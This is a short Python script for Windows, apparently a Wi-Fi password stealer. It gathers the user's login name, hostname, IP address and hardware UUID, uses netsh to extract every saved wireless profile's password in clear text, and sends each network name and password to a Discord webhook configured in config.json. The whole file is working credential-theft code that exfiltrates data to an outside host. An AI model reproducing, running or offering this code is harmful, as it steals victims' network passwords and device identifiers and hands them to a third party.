import subprocess, json, os, socket
from discord_webhook import DiscordWebhook

with open('config.json') as f:
    config = json.load(f)
    my_hwid = config.get('my_hwid')
    Discord_webhook_URL = config.get('Discord_webhook_URL')

pc_user = os.getlogin()
pc_name = socket.gethostname()
IP = socket.gethostbyname(socket.gethostname())
hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        results = f"[ WIFI LOG ]\nUser: {pc_user}\nDevice: {pc_name}\nIP: {IP}\nHWID: {hwid}" + "\nNetwork: {:<30}\nPassword: {:<}\n------------------------------\n".format(i, results[0])

        AuthHook = DiscordWebhook(url=Discord_webhook_URL, content=results)
        AuthHook.execute()

    except IndexError:
        results = "{:<30}|  {:<}".format(i, "")
  
